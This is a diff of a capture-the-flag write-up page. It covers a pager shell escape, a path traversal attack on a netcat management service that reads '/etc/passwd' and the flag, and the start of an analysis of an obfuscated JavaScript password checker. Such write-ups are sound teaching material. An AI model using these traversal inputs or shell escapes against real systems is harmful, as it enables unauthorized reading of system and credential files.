@@ -40,8 +40,8 @@ SYNOPSIS
        procan
 [...]
 </code></pre>
-<p>It is a <code>man</code> page for <code>socat</code>, over the pager <code>less</code>. Tying <code>q</code> would drop the
-connection. Let's check the help page:</p>
+<p>It is the <code>man</code> page for <code>socat</code>, over the pager <code>less</code>. Tying <code>q</code> would drop
+the connection. Let's check the help page:</p>
 <pre><code>[...]
   !command             Execute the shell command with $SHELL.
   |Xcommand            Pipe file between current pos &amp; mark X to shell command.
@@ -63,7 +63,96 @@ Disabling DMZ using password CTF{SOmething-CATastr0phic}
 /home/moar/disable_dmz.sh: 18: /home/moar/disable_dmz.sh: cannot create /dev/dmz: Read-only file system
 </code></pre>
 <p>And there is the flag.</p>
-<h2 id="adminui">Admin UI</h2></div>
+<h2 id="adminui">Admin UI</h2>
+<p>Another remote exploitation quest, let's connect:</p>
+<pre><code>$ nc mngmnt-iface.ctfcompetition.com 1337
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+
+1
+Please enter the backdoo^Wservice password:
+
+abcd
+Incorrect, the authorities have been informed!
+</code></pre>
+<p>Ops, that didn't work. What are in the patch notes?</p>
+<pre><code>[...]
+2
+The following patchnotes were found:
+ - Version0.3
+ - Version0.2
+Which patchnotes should be shown?
+
+Version0.3
+# Version 0.3
+ - Rollback of version 0.2 because of random reasons
+ - Blah Blah
+ - Fix random reboots at 2:32 every second Friday when it's new-moon.
+
+[...]
+Version0.2
+# Release 0.2
+ - Updated library X to version 0.Y
+ - Fixed path traversal bug
+ - Improved the UX
+
+[...]
+Version0.1
+Error: No such file or directory
+</code></pre>
+<p>Hum, <code>No such file or directory</code>? Looks like it will print any file that
+exists. I tried <code>flag</code> and <code>flag.txt</code>, but it didn't work. Looking closer at
+the patch notes, version 0.2 mentions something about path traversal bug fix
+and 0.3 rolled that back. Is that a hint?</p>
+<pre><code>[...]
+../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+[...]
+</code></pre>
+<p>Oh, it works! Let's see if we can find flag with path traversal:</p>
+<pre><code>[...]
+../flag
+CTF{I_luv_buggy_sOFtware}
+</code></pre>
+<h2 id="jssafe">JS Safe</h2>
+<p>The ZIP file only contains a HTML file. Opening it reveals some HTML, CSS, and
+two <code>&lt;script&gt;</code> tags. The second one seems to be just the basic functionality of
+the webpage, and the first one is the one to investigate. Also, it looks like
+the password to the safe is also the flag, as the following regular expression
+is in the second script tag:</p>
+<pre><code class="JavaScript language-JavaScript">  password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);
+</code></pre>
+<p>The first script block looks like this:</p>
+<pre><code class="JavaScript language-JavaScript">async function x(password) {
+    // TODO: check if they can just use Google to get the password once they understand how this works.
+    var code = '&lt;long string removed&gt;'
+    var env = {
+        a: (x,y) =&gt; x[y],
+        b: (x,y) =&gt; Function.constructor.apply.apply(x, y),
+        c: (x,y) =&gt; x+y,
+        d: (x) =&gt; String.fromCharCode(x),
+        e: 0,
+        f: 1,
+        g: new TextEncoder().encode(password),
+        h: 0,
+    };
+    for (var i = 0; i &lt; code.length; i += 4) {
+        var [lhs, fn, arg1, arg2] = code.substr(i, 4);
+        try {
+            env[lhs] = env[fn](env[arg1], env[arg2]);
+        } catch(e) {
+            env[lhs] = new env[fn](env[arg1], env[arg2]);
+        }
+        if (env[lhs] instanceof Promise) env[lhs] = await env[lhs];
+    }
+    return !env.h;
+}
+</code></pre></div>
 
     <div class="container footer">
         <p>By Hugo Xu (@jspenguin2017)</p>
